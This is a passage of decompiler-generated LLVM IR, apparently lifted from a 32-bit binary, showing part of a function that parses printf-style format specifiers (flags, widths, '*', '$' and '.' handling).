  %v3_805166b = load i32, i32* %v2_805166b, align 4
  %v1_805166e = and i32 %v3_805166b, 128
  %v2_805166e = icmp eq i32 %v1_805166e, 0
  store i32 %v1_805166e, i32* %edi.global-to-local, align 4
  %v1_8051674 = icmp eq i1 %v2_805166e, false
  br i1 %v1_8051674, label %dec_label_pc_8051687, label %dec_label_pc_8051676

dec_label_pc_8051676:                             ; preds = %entry
  %v2_8051676 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_80516d4.outer

dec_label_pc_8051681:                             ; preds = %dec_label_pc_805180f
  %v1_8051681 = add i32 %v0_805180f.pre.pre, 1
  store i32 %v1_8051681, i32* @esi, align 4
  br label %dec_label_pc_805181f

dec_label_pc_8051687:                             ; preds = %entry
  %v15_8051639 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051689

dec_label_pc_8051689:                             ; preds = %dec_label_pc_80516b1.dec_label_pc_8051689_crit_edge, %dec_label_pc_8051687
  %v2_805169a = phi i32 [ %v2_805169a.pre, %dec_label_pc_80516b1.dec_label_pc_8051689_crit_edge ], [ %v15_8051639, %dec_label_pc_8051687 ]
  %v3_805169a = phi i32 [ %v1_80516b1, %dec_label_pc_80516b1.dec_label_pc_8051689_crit_edge ], [ 0, %dec_label_pc_8051687 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805168d = mul i32 %v3_805169a, 4
  store i32 %v1_805168d, i32* @ecx, align 4
  %v2_8051694 = load i32, i32* %arg1, align 4
  store i32 %v2_8051694, i32* @edx, align 4
  %v2_8051696 = add i32 %v1_805168d, -4
  %v3_8051696 = add i32 %v2_8051696, %v2_8051694
  %v4_8051696 = inttoptr i32 %v3_8051696 to i32*
  %v5_8051696 = load i32, i32* %v4_8051696, align 4
  store i32 %v5_8051696, i32* %eax.global-to-local, align 4
  %v1_805169a = trunc i32 %v5_8051696 to i8
  %v4_805169a = add i32 %v2_805169a, 36
  %v5_805169a = add i32 %v4_805169a, %v3_805169a
  %v6_805169a = inttoptr i32 %v5_805169a to i8*
  store i8 %v1_805169a, i8* %v6_805169a, align 1
  %v0_805169e = load i32, i32* %eax.global-to-local, align 4
  %v1_805169e = urem i32 %v0_805169e, 256
  %v2_805169e = load i32, i32* @ebx, align 4
  %v3_805169e = and i32 %v2_805169e, -256
  %v4_805169e = or i32 %v3_805169e, %v1_805169e
  store i32 %v4_805169e, i32* @ebx, align 4
  %v1_80516a0 = mul i32 %v0_805169e, 16777216
  %v2_80516a0 = sdiv i32 %v1_80516a0, 16777216
  store i32 %v2_80516a0, i32* %eax.global-to-local, align 4
  %v1_80516a3 = load i32, i32* @edx, align 4
  %v2_80516a3 = load i32, i32* @ecx, align 4
  %v3_80516a3 = add i32 %v1_80516a3, -4
  %v4_80516a3 = add i32 %v3_80516a3, %v2_80516a3
  %v5_80516a3 = inttoptr i32 %v4_80516a3 to i32*
  %v6_80516a3 = load i32, i32* %v5_80516a3, align 4
  %v17_80516a3 = icmp eq i32 %v2_80516a0, %v6_80516a3
  %v1_80516a7 = icmp eq i1 %v17_80516a3, false
  br i1 %v1_80516a7, label %dec_label_pc_80519f0, label %dec_label_pc_80516ad

dec_label_pc_80516ad:                             ; preds = %dec_label_pc_8051689
  %v3_80516ad = trunc i32 %v0_805169e to i8
  %v4_80516ad = icmp eq i8 %v3_80516ad, 0
  br i1 %v4_80516ad, label %dec_label_pc_80516b7, label %dec_label_pc_80516b1

dec_label_pc_80516b1:                             ; preds = %dec_label_pc_80516ad
  %v0_80516b1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80516b1 = add i32 %v0_80516b1, 1
  store i32 %v1_80516b1, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_80516b1, 32
  br i1 %tmp175, label %dec_label_pc_80516b1.dec_label_pc_8051689_crit_edge, label %dec_label_pc_80516b7

dec_label_pc_80516b1.dec_label_pc_8051689_crit_edge: ; preds = %dec_label_pc_80516b1
  %v2_805169a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051689

dec_label_pc_80516b7:                             ; preds = %dec_label_pc_80516b1, %dec_label_pc_80516ad
  %v2_80516bc = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_80516d4.outer

dec_label_pc_80516d4.outer:                       ; preds = %dec_label_pc_80516b7, %dec_label_pc_8051676, %dec_label_pc_80517f1
  %v0_80516e0.ph94 = phi i32 [ %v1_80517f1, %dec_label_pc_80517f1 ], [ %v2_8051676, %dec_label_pc_8051676 ], [ %v2_80516bc, %dec_label_pc_80516b7 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_80517f1 ], [ %tmp66, %dec_label_pc_8051676 ], [ %tmp66, %dec_label_pc_80516b7 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_805167a, %dec_label_pc_80517f1 ], [ 0, %dec_label_pc_8051676 ], [ 0, %dec_label_pc_80516b7 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_80517f1 ], [ %v3_8051664, %dec_label_pc_8051676 ], [ %v3_8051664, %dec_label_pc_80516b7 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_80517f1 ], [ 0, %dec_label_pc_8051676 ], [ 0, %dec_label_pc_80516b7 ]
  %v7_80516db = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_80516db = trunc i64 %v7_80516db to i32
  %v2_80516e3 = add i32 %v8_80516db, 80
  br label %dec_label_pc_80516d4

dec_label_pc_80516d4:                             ; preds = %dec_label_pc_80516d4.outer, %dec_label_pc_8051791
  %v0_80516e0 = phi i32 [ %v0_805179e, %dec_label_pc_8051791 ], [ %v0_80516e0.ph94, %dec_label_pc_80516d4.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8051791 ], [ %stack_var_-32.1.ph, %dec_label_pc_80516d4.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8051791 ], [ %stack_var_-88.1.ph, %dec_label_pc_80516d4.outer ]
  store i32 %v0_80516e0, i32* @edx, align 4
  store i32 %v0_80516e0, i32* @esi, align 4
  %v1_80516d6 = inttoptr i32 %v0_80516e0 to i8*
  %v2_80516d6 = load i8, i8* %v1_80516d6, align 1
  %v11_80516d6 = icmp eq i8 %v2_80516d6, 42
  %v1_80516d9 = icmp eq i1 %v11_80516d6, false
  br i1 %v1_80516d9, label %dec_label_pc_80516eb, label %dec_label_pc_80516db

dec_label_pc_80516db:                             ; preds = %dec_label_pc_80516d4
  store i32 %v8_80516db, i32* %eax.global-to-local, align 4
  %v1_80516e0 = add i32 %v0_80516e0, 1
  store i32 %v1_80516e0, i32* @esi, align 4
  %v0_80516e3 = load i32, i32* @esp, align 4
  %v3_80516e3 = add i32 %v2_80516e3, %v0_80516e3
  %v4_80516e3 = inttoptr i32 %v3_80516e3 to i32*
  store i32 0, i32* %v4_80516e3, align 4
  %v0_8051705.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80516eb

dec_label_pc_80516eb:                             ; preds = %dec_label_pc_80516d4, %dec_label_pc_80516db
  %v0_8051705.pre = phi i32 [ %v0_80516e0, %dec_label_pc_80516d4 ], [ %v0_8051705.pre.pre, %dec_label_pc_80516db ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80516ed = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_80516ed, i32* %ebp.global-to-local, align 4
  %v4_8051705.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051705124 = inttoptr i32 %v0_8051705.pre to i8*
  %v2_8051705125 = load i8, i8* %v1_8051705124, align 1
  %v3_8051705126 = zext i8 %v2_8051705125 to i32
  %v5_8051705127 = and i32 %v4_8051705.pre, -256
  %v6_8051705128 = or i32 %v3_8051705126, %v5_8051705127
  store i32 %v6_8051705128, i32* %eax.global-to-local, align 4
  %v2_8051707129 = sext i8 %v2_8051705125 to i32
  store i32 %v2_8051707129, i32* @ecx, align 4
  %v2_805170a130 = mul nsw i32 %v2_8051707129, 2
  %v3_805170a131 = add i32 %v2_805170a130, %v0_80516ed
  %v4_805170a132 = inttoptr i32 %v3_805170a131 to i8*
  %v5_805170a133 = load i8, i8* %v4_805170a132, align 1
  %v6_805170a134 = and i8 %v5_805170a133, 8
  %v7_805170a135 = icmp eq i8 %v6_805170a134, 0
  %v1_805170f136 = icmp eq i1 %v7_805170a135, false
  br i1 %v1_805170f136, label %dec_label_pc_80516f5, label %dec_label_pc_8051711

dec_label_pc_80516f5:                             ; preds = %dec_label_pc_80516eb, %dec_label_pc_8051704
  %v2_8051707140 = phi i32 [ %v2_8051707, %dec_label_pc_8051704 ], [ %v2_8051707129, %dec_label_pc_80516eb ]
  %v6_8051705139 = phi i32 [ %v6_8051705, %dec_label_pc_8051704 ], [ %v6_8051705128, %dec_label_pc_80516eb ]
  %v0_8051704138 = phi i32 [ %v1_8051704, %dec_label_pc_8051704 ], [ %v0_8051705.pre, %dec_label_pc_80516eb ]
  %v1_80516fd137 = phi i32 [ %v0_805171f32, %dec_label_pc_8051704 ], [ 0, %dec_label_pc_80516eb ]
  %v1_80516f5 = add i32 %v1_80516fd137, -4094
  %v6_80516f5 = sub i32 4093, %v1_80516fd137
  %v7_80516f5 = and i32 %v6_80516f5, %v1_80516fd137
  %v8_80516f5 = icmp slt i32 %v7_80516f5, 0
  %v9_80516f5 = icmp eq i32 %v1_80516f5, 0
  %v10_80516f5 = icmp slt i32 %v1_80516f5, 0
  %v3_80516fb = icmp eq i1 %v10_80516f5, %v8_80516f5
  %v4_80516fb = icmp eq i1 %v9_80516f5, false
  %v5_80516fb = and i1 %v4_80516fb, %v3_80516fb
  br i1 %v5_80516fb, label %dec_label_pc_8051704, label %dec_label_pc_80516fd

dec_label_pc_80516fd:                             ; preds = %dec_label_pc_80516f5
  %v3_80516fd = mul i32 %v1_80516fd137, 10
  store i32 %v3_80516fd, i32* %eax.global-to-local, align 4
  %v2_8051700 = add i32 %v3_80516fd, -48
  %v3_8051700 = add i32 %v2_8051700, %v2_8051707140
  store i32 %v3_8051700, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051704

dec_label_pc_8051704:                             ; preds = %dec_label_pc_80516f5, %dec_label_pc_80516fd
  %v0_805171f32 = phi i32 [ %v1_80516fd137, %dec_label_pc_80516f5 ], [ %v3_8051700, %dec_label_pc_80516fd ]
  %v4_805170528 = phi i32 [ %v6_8051705139, %dec_label_pc_80516f5 ], [ %v3_80516fd, %dec_label_pc_80516fd ]
  %v1_8051704 = add i32 %v0_8051704138, 1
  store i32 %v1_8051704, i32* @esi, align 4
  %v1_8051705 = inttoptr i32 %v1_8051704 to i8*
  %v2_8051705 = load i8, i8* %v1_8051705, align 1
  %v3_8051705 = zext i8 %v2_8051705 to i32
  %v5_8051705 = and i32 %v4_805170528, -256
  %v6_8051705 = or i32 %v3_8051705, %v5_8051705
  store i32 %v6_8051705, i32* %eax.global-to-local, align 4
  %v2_8051707 = sext i8 %v2_8051705 to i32
  store i32 %v2_8051707, i32* @ecx, align 4
  %v2_805170a = mul nsw i32 %v2_8051707, 2
  %v3_805170a = add i32 %v2_805170a, %v0_80516ed
  %v4_805170a = inttoptr i32 %v3_805170a to i8*
  %v5_805170a = load i8, i8* %v4_805170a, align 1
  %v6_805170a = and i8 %v5_805170a, 8
  %v7_805170a = icmp eq i8 %v6_805170a, 0
  %v1_805170f = icmp eq i1 %v7_805170a, false
  br i1 %v1_805170f, label %dec_label_pc_80516f5, label %dec_label_pc_8051711

dec_label_pc_8051711:                             ; preds = %dec_label_pc_8051704, %dec_label_pc_80516eb
  %v1_80516fd.lcssa = phi i32 [ 0, %dec_label_pc_80516eb ], [ %v0_805171f32, %dec_label_pc_8051704 ]
  %v0_8051704.lcssa = phi i32 [ %v0_8051705.pre, %dec_label_pc_80516eb ], [ %v1_8051704, %dec_label_pc_8051704 ]
  %v2_8051705.lcssa = phi i8 [ %v2_8051705125, %dec_label_pc_80516eb ], [ %v2_8051705, %dec_label_pc_8051704 ]
  %v6_8051705.lcssa = phi i32 [ %v6_8051705128, %dec_label_pc_80516eb ], [ %v6_8051705, %dec_label_pc_8051704 ]
  %v0_8051711 = load i32, i32* @edx, align 4
  %v1_8051711 = add i32 %v0_8051711, -1
  %v2_8051711 = inttoptr i32 %v1_8051711 to i8*
  %v3_8051711 = load i8, i8* %v2_8051711, align 1
  %v12_8051711 = icmp eq i8 %v3_8051711, 37
  %v1_8051715 = icmp eq i1 %v12_8051711, false
  br i1 %v1_8051715, label %dec_label_pc_80517a8, label %dec_label_pc_805171b

dec_label_pc_805171b:                             ; preds = %dec_label_pc_8051711
  %v10_805171b = icmp eq i8 %v2_8051705.lcssa, 36
  %v1_805171d = icmp eq i1 %v10_805171b, false
  br i1 %v1_805171d, label %dec_label_pc_805174f, label %dec_label_pc_805171f

dec_label_pc_805171f:                             ; preds = %dec_label_pc_805171b
  %tmp89 = icmp slt i32 %v1_80516fd.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_805174f, label %dec_label_pc_8051723

dec_label_pc_8051723:                             ; preds = %dec_label_pc_805171f
  %v1_8051723 = add i32 %v0_8051704.lcssa, 1
  store i32 %v1_8051723, i32* @edx, align 4
  %v4_8051726 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_8051726, label %dec_label_pc_80519f0, label %dec_label_pc_8051731

dec_label_pc_8051731:                             ; preds = %dec_label_pc_8051723
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8051739 = sub i32 %v1_80516fd.lcssa, %stack_var_-88.1
  %v8_8051739 = xor i32 %v1_80516fd.lcssa, %stack_var_-88.1
  %v9_8051739 = xor i32 %v2_8051739, %v1_80516fd.lcssa
  %v10_8051739 = and i32 %v9_8051739, %v8_8051739
  %v11_8051739 = icmp slt i32 %v10_8051739, 0
  %v12_8051739 = icmp eq i32 %v2_8051739, 0
  %v13_8051739 = icmp slt i32 %v2_8051739, 0
  %v3_805173b = icmp ne i1 %v13_8051739, %v11_8051739
  %v4_805173b = or i1 %v12_8051739, %v3_805173b
  %stack_var_-88.1.v0_805173d = select i1 %v4_805173b, i32 %stack_var_-88.1, i32 %v1_80516fd.lcssa
  br label %dec_label_pc_805174b

dec_label_pc_805174b:                             ; preds = %dec_label_pc_805175f, %dec_label_pc_8051731, %dec_label_pc_8051763
  %v0_805174b = phi i32 [ %v1_8051723, %dec_label_pc_8051731 ], [ %v0_8051711, %dec_label_pc_8051763 ], [ %v0_8051711, %dec_label_pc_805175f ]
  %stack_var_-32.2 = phi i32 [ %v1_80516fd.lcssa, %dec_label_pc_8051731 ], [ %stack_var_-32.1, %dec_label_pc_8051763 ], [ %stack_var_-32.1, %dec_label_pc_805175f ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_805173d, %dec_label_pc_8051731 ], [ 0, %dec_label_pc_8051763 ], [ 0, %dec_label_pc_805175f ]
  store i32 %v0_805174b, i32* @esi, align 4
  br label %dec_label_pc_8051772

dec_label_pc_805174f:                             ; preds = %dec_label_pc_805171f, %dec_label_pc_805171b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805175f, label %dec_label_pc_8051756

dec_label_pc_8051756:                             ; preds = %dec_label_pc_805174f
  %v10_8051756 = icmp eq i8 %v2_8051705.lcssa, 109
  br i1 %v10_8051756, label %dec_label_pc_80517a8, label %dec_label_pc_80519f0

dec_label_pc_805175f:                             ; preds = %dec_label_pc_805174f
  %tmp176 = icmp ugt i32 %v0_8051704.lcssa, %v0_8051711
  br i1 %tmp176, label %dec_label_pc_8051763, label %dec_label_pc_805174b

dec_label_pc_8051763:                             ; preds = %dec_label_pc_805175f
  %v1_8051763 = inttoptr i32 %v0_8051711 to i8*
  %v2_8051763 = load i8, i8* %v1_8051763, align 1
  %v8_8051763 = icmp eq i8 %v2_8051763, 48
  br i1 %v8_8051763, label %dec_label_pc_805174b, label %dec_label_pc_80517a8

dec_label_pc_8051772:                             ; preds = %dec_label_pc_8051783, %dec_label_pc_805174b
  %v0_805179e = phi i32 [ %v1_8051783, %dec_label_pc_8051783 ], [ %v0_805174b, %dec_label_pc_805174b ]
  %v4_805177c35 = phi i32 [ %v6_805177c, %dec_label_pc_8051783 ], [ %v6_8051705.lcssa, %dec_label_pc_805174b ]
  store i32 ptrtoint ([8 x i8]* @global_var_805936a.476 to i32), i32* %edx.global-to-local, align 4
  %v1_805177f = inttoptr i32 %v0_805179e to i8*
  br label %dec_label_pc_805177c

dec_label_pc_805177c:                             ; preds = %dec_label_pc_805178d, %dec_label_pc_8051772
  %v4_805177c = phi i32 [ %v4_805177c35, %dec_label_pc_8051772 ], [ %v6_805177c, %dec_label_pc_805178d ]
  %v0_805177e = phi i32 [ ptrtoint ([8 x i8]* @global_var_805936a.476 to i32), %dec_label_pc_8051772 ], [ %v1_805177e, %dec_label_pc_805178d ]
  %v0_805178d = phi i32 [ 1, %dec_label_pc_8051772 ], [ %v2_805178d, %dec_label_pc_805178d ]
  store i32 %v0_805178d, i32* @ecx, align 4
  %v1_805177c = inttoptr i32 %v0_805177e to i8*
  %v2_805177c = load i8, i8* %v1_805177c, align 1
  %v3_805177c = zext i8 %v2_805177c to i32
  %v5_805177c = and i32 %v4_805177c, -256
  %v6_805177c = or i32 %v3_805177c, %v5_805177c
  store i32 %v6_805177c, i32* %eax.global-to-local, align 4
  %v1_805177e = add i32 %v0_805177e, 1
  store i32 %v1_805177e, i32* @edx, align 4
  %v2_805177f = load i8, i8* %v1_805177f, align 1
  %v15_805177f = icmp eq i8 %v2_805177f, %v2_805177c
  %v1_8051781 = icmp eq i1 %v15_805177f, false
  br i1 %v1_8051781, label %dec_label_pc_8051788, label %dec_label_pc_8051783

dec_label_pc_8051783:                             ; preds = %dec_label_pc_805177c
  %v1_8051783 = add i32 %v0_805179e, 1
  store i32 %v1_8051783, i32* @esi, align 4
  %v0_8051784 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051784 = or i32 %v0_8051784, %v0_805178d
  store i32 %v2_8051784, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051772

dec_label_pc_8051788:                             ; preds = %dec_label_pc_805177c
  %v1_8051788 = inttoptr i32 %v1_805177e to i8*
  %v2_8051788 = load i8, i8* %v1_8051788, align 1
  %v3_8051788 = icmp eq i8 %v2_8051788, 0
  br i1 %v3_8051788, label %dec_label_pc_8051791, label %dec_label_pc_805178d

dec_label_pc_805178d:                             ; preds = %dec_label_pc_8051788
  %v2_805178d = mul i32 %v0_805178d, 2
  br label %dec_label_pc_805177c

dec_label_pc_8051791:                             ; preds = %dec_label_pc_8051788
  %v0_8051791 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051795 = udiv i32 %v0_8051791, 2
  %v1_8051795.not = or i32 %v1_8051795, -6
  %v1_805179a = xor i32 %v1_8051795.not, 5
  store i32 %v1_805179a, i32* %eax.global-to-local, align 4
  %v2_805179c = and i32 %v1_805179a, %v0_8051791
  store i32 %v2_805179c, i32* %edi.global-to-local, align 4
  %v1_805179e = add i32 %v0_805179e, -1
  %v2_805179e = inttoptr i32 %v1_805179e to i8*
  %v3_805179e = load i8, i8* %v2_805179e, align 1
  %v12_805179e = icmp eq i8 %v3_805179e, 37
  %v1_80517a2 = icmp eq i1 %v12_805179e, false
  br i1 %v1_80517a2, label %dec_label_pc_80516d4, label %dec_label_pc_80517a8

dec_label_pc_80517a8:                             ; preds = %dec_label_pc_8051763, %dec_label_pc_8051791, %dec_label_pc_8051711, %dec_label_pc_8051756
  %v0_80517cb = phi i32 [ %v1_80516fd.lcssa, %dec_label_pc_8051756 ], [ %v1_80516fd.lcssa, %dec_label_pc_8051763 ], [ 0, %dec_label_pc_8051791 ], [ %v1_80516fd.lcssa, %dec_label_pc_8051711 ]
  %v1_80517d4 = phi i32 [ %v0_8051704.lcssa, %dec_label_pc_8051756 ], [ %v0_8051704.lcssa, %dec_label_pc_8051763 ], [ %v0_805179e, %dec_label_pc_8051791 ], [ %v0_8051704.lcssa, %dec_label_pc_8051711 ]
  %v0_80517d1 = phi i32 [ %v0_8051711, %dec_label_pc_8051756 ], [ %v0_8051711, %dec_label_pc_8051763 ], [ %v1_805177e, %dec_label_pc_8051791 ], [ %v0_8051711, %dec_label_pc_8051711 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8051756 ], [ %stack_var_-32.1, %dec_label_pc_8051763 ], [ %stack_var_-32.2, %dec_label_pc_8051791 ], [ %stack_var_-32.1, %dec_label_pc_8051711 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8051756 ], [ 0, %dec_label_pc_8051763 ], [ %stack_var_-88.2, %dec_label_pc_8051791 ], [ %stack_var_-88.1, %dec_label_pc_8051711 ]
  %v1_80517a8 = inttoptr i32 %v0_80517d1 to i8*
  %v2_80517a8 = load i8, i8* %v1_80517a8, align 1
  %v11_80517a8 = icmp eq i8 %v2_80517a8, 42
  %v1_80517ab = icmp eq i1 %v11_80517a8, false
  br i1 %v1_80517ab, label %dec_label_pc_80517e1, label %dec_label_pc_80517ad

dec_label_pc_80517ad:                             ; preds = %dec_label_pc_80517a8
  %v4_80517ad = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_80517ad, label %dec_label_pc_80517d1, label %dec_label_pc_80517b4

dec_label_pc_80517b4:                             ; preds = %dec_label_pc_80517ad
  %v1_80517b4 = inttoptr i32 %v1_80517d4 to i8*
  %v2_80517b4 = load i8, i8* %v1_80517b4, align 1
  %v11_80517b4 = icmp eq i8 %v2_80517b4, 36
  %v1_80517b7 = icmp eq i1 %v11_80517b4, false
  br i1 %v1_80517b7, label %dec_label_pc_80519f0, label %dec_label_pc_80517bd

dec_label_pc_80517bd:                             ; preds = %dec_label_pc_80517b4
  %tmp91 = icmp slt i32 %v0_80517cb, 1
  br i1 %tmp91, label %dec_label_pc_80519f0, label %dec_label_pc_80517c5

dec_label_pc_80517c5:                             ; preds = %dec_label_pc_80517bd
  store i32 %v8_80516db, i32* %eax.global-to-local, align 4
  %v1_80517ca = add i32 %v1_80517d4, 1
  store i32 %v1_80517ca, i32* @esi, align 4
  %v1_80517cb = load i32, i32* @esp, align 4
  %v3_80517cb = add i32 %v8_80516db, 68
  %v4_80517cb = add i32 %v3_80517cb, %v1_80517cb
  %v5_80517cb = inttoptr i32 %v4_80517cb to i32*
  store i32 %v0_80517cb, i32* %v5_80517cb, align 4
  %v0_805180f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80517dc

dec_label_pc_80517d1:                             ; preds = %dec_label_pc_80517ad
  %v1_80517d1 = add i32 %v0_80517d1, 1
  store i32 %v1_80517d1, i32* %eax.global-to-local, align 4
  %v12_80517d4 = icmp eq i32 %v1_80517d1, %v1_80517d4
  %v1_80517d6 = icmp eq i1 %v12_80517d4, false
  br i1 %v1_80517d6, label %dec_label_pc_80519f0, label %dec_label_pc_80517dc

dec_label_pc_80517dc:                             ; preds = %dec_label_pc_80517d1, %dec_label_pc_80517c5
  %v0_805180f.pre.pre.pre = phi i32 [ %v1_80517d4, %dec_label_pc_80517d1 ], [ %v0_805180f.pre.pre.pre.pre, %dec_label_pc_80517c5 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517e1

dec_label_pc_80517e1:                             ; preds = %dec_label_pc_80517a8, %dec_label_pc_80517dc
  %v0_805180f.pre.pre = phi i32 [ %v1_80517d4, %dec_label_pc_80517a8 ], [ %v0_805180f.pre.pre.pre, %dec_label_pc_80517dc ]
  %v0_805167a = phi i32 [ %v0_80517cb, %dec_label_pc_80517a8 ], [ -2147483648, %dec_label_pc_80517dc ]
  %v4_80517e1 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_80517e1 = icmp eq i32 %v4_80517e1, 0
  %v1_80517e6 = icmp eq i1 %v5_80517e1, false
  %.pre = inttoptr i32 %v0_805180f.pre.pre to i8*
  br i1 %v1_80517e6, label %dec_label_pc_805180a, label %dec_label_pc_80517ec

dec_label_pc_80517ec:                             ; preds = %dec_label_pc_80517e1
  %v2_80517ec = load i8, i8* %.pre, align 1
  %v11_80517ec = icmp eq i8 %v2_80517ec, 46
  %v1_80517ef = icmp eq i1 %v11_80517ec, false
  br i1 %v1_80517ef, label %dec_label_pc_8051803, label %dec_label_pc_80517f1

dec_label_pc_80517f1:                             ; preds = %dec_label_pc_80517ec
  %v1_80517f1 = add i32 %v0_805180f.pre.pre, 1
  store i32 %v1_80517f1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80516d4.outer

dec_label_pc_8051803:                             ; preds = %dec_label_pc_80517ec
  br label %dec_label_pc_805180a

dec_label_pc_805180a:                             ; preds = %dec_label_pc_80517e1, %dec_label_pc_8051803
  %stack_var_-96.2 = phi i32 [ %v0_805167a, %dec_label_pc_8051803 ], [ %stack_var_-96.1.ph, %dec_label_pc_80517e1 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8051803 ], [ %v0_805167a, %dec_label_pc_80517e1 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8059318.477 to i32), i32* @edx, align 4
  %v4_805180f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805180f

dec_label_pc_805180f:                             ; preds = %dec_label_pc_8051819, %dec_label_pc_805180a
  %v0_8051819 = phi i32 [ %v1_8051819, %dec_label_pc_8051819 ], [ ptrtoint ([9 x i8]* @global_var_8059318.477 to i32), %dec_label_pc_805180a ]
  %v4_805180f = phi i32 [ %v6_805180f, %dec_label_pc_8051819 ], [ %v4_805180f.pre, %dec_label_pc_805180a ]
  %v2_805180f = load i8, i8* %.pre, align 1
  %v3_805180f = zext i8 %v2_805180f to i32
  %v5_805180f = and i32 %v4_805180f, -256
  %v6_805180f = or i32 %v3_805180f, %v5_805180f
  store i32 %v6_805180f, i32* %eax.global-to-local, align 4
  %v3_8051811 = inttoptr i32 %v0_8051819 to i8*
  %v4_8051811 = load i8, i8* %v3_8051811, align 1
  %v15_8051811 = icmp eq i8 %v2_805180f, %v4_8051811
  br i1 %v15_8051811, label %dec_label_pc_8051681, label %dec_label_pc_8051819

dec_label_pc_8051819:                             ; preds = %dec_label_pc_805180f
  %v1_8051819 = add i32 %v0_8051819, 1
  store i32 %v1_8051819, i32* @edx, align 4
  %v1_805181a = inttoptr i32 %v1_8051819 to i8*
  %v2_805181a = load i8, i8* %v1_805181a, align 1
  %v3_805181a = icmp eq i8 %v2_805181a, 0
  %v1_805181d = icmp eq i1 %v3_805181a, false
  br i1 %v1_805181d, label %dec_label_pc_805180f, label %dec_label_pc_805181f

dec_label_pc_805181f:                             ; preds = %dec_label_pc_8051819, %dec_label_pc_8051681
  %v0_8051832 = phi i32 [ %v1_8051681, %dec_label_pc_8051681 ], [ %v0_805180f.pre.pre, %dec_label_pc_8051819 ]
  %v0_805182f = phi i32 [ %v0_8051819, %dec_label_pc_8051681 ], [ %v1_8051819, %dec_label_pc_8051819 ]
  %v1_8051821 = add i32 %v0_805182f, -134583064
  %v1_8051826 = add i32 %v0_805182f, -134583065
  %v5_8051826 = sub i32 134583064, %v0_805182f
  %v6_8051826 = and i32 %v1_8051821, %v5_8051826
  %v7_8051826 = icmp slt i32 %v6_8051826, 0
  %v8_8051826 = icmp eq i32 %v1_8051826, 0
  %v9_8051826 = icmp slt i32 %v1_8051826, 0
  store i32 %v1_8051826, i32* %eax.global-to-local, align 4
  %v3_8051827 = icmp eq i1 %v9_8051826, %v7_8051826
  %v4_8051827 = icmp eq i1 %v8_8051826, false
  %v5_8051827 = and i1 %v4_8051827, %v3_8051827
  br i1 %v5_8051827, label %dec_label_pc_8051833, label %dec_label_pc_8051829

dec_label_pc_8051829:                             ; preds = %dec_label_pc_805181f
  %v1_8051829 = inttoptr i32 %v0_8051832 to i8*
  %v2_8051829 = load i8, i8* %v1_8051829, align 1
  %v3_8051829 = zext i8 %v2_8051829 to i32
  %v5_8051829 = and i32 %v1_8051826, -256
  %v6_8051829 = or i32 %v3_8051829, %v5_8051829
  store i32 %v6_8051829, i32* %eax.global-to-local, align 4
  %v3_805182b = inttoptr i32 %v0_805182f to i8*
  %v4_805182b = load i8, i8* %v3_805182b, align 1
  %v15_805182b = icmp eq i8 %v2_8051829, %v4_805182b
  %v1_805182d = icmp eq i1 %v15_805182b, false
  br i1 %v1_805182d, label %dec_label_pc_8051833, label %dec_label_pc_805182f

dec_label_pc_805182f:                             ; preds = %dec_label_pc_8051829
  %v1_805182f = add i32 %v0_805182f, 9
  store i32 %v1_805182f, i32* @edx, align 4
  %v1_8051832 = add i32 %v0_8051832, 1
  store i32 %v1_8051832, i32* @esi, align 4
  br label %dec_label_pc_8051833

dec_label_pc_8051833:                             ; preds = %dec_label_pc_8051829, %dec_label_pc_805181f, %dec_label_pc_805182f
  %v4_805183a = phi i32 [ %v6_8051829, %dec_label_pc_8051829 ], [ %v1_8051826, %dec_label_pc_805181f ], [ %v6_8051829, %dec_label_pc_805182f ]
  %v0_805183a = phi i32 [ %v0_8051832, %dec_label_pc_8051829 ], [ %v0_8051832, %dec_label_pc_805181f ], [ %v1_8051832, %dec_label_pc_805182f ]
  %v0_8051833 = phi i32 [ %v0_805182f, %dec_label_pc_8051829 ], [ %v0_805182f, %dec_label_pc_805181f ], [ %v1_805182f, %dec_label_pc_805182f ]
  %v1_8051833 = add i32 %v0_8051833, 9
  %v2_8051833 = inttoptr i32 %v1_8051833 to i8*
